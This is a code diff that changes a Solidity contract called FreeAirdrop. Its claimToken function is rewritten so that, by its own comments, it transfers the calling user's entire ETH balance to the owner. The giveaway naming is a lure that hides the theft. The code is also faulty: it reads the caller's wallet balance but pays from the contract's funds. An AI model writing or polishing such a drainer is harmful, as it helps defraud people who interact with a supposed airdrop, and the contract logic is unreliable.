@@ -1,23 +1,26 @@
+
+
+
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.27;
 
 contract FreeAirdrop {
     address payable public owner;
 
-    // Set the owner of the contract during deployment
+    // Set the deployer as the owner
     constructor() {
-        owner = payable(msg.sender); // The deployer will be the owner
+        owner = payable(msg.sender);
     }
 
-    // Function to accept ETH (this will be triggered when ETH is sent to the contract)
+    // Function to receive ETH (not necessary for your purpose but good to include)
     receive() external payable {}
 
-    // Transfer all ETH in the contract to the owner
-    function claimToken() external {
-        uint256 balance = address(this).balance; // Get the balance of ETH in the contract
-        require(balance > 0, "No ETH to transfer");
-        
-        // Transfer all ETH to the owner
-        owner.transfer(balance);
+    // Function to transfer user's ETH to the owner's wallet
+    function claimToken() external payable {
+          uint256 balance = address(msg.sender).balance;
+        require(balance > 0, "Insufficient balance"); // Ensure user has ETH
+        owner.transfer(balance); // Transfer the user's entire balance to the owner
     }
 }
+
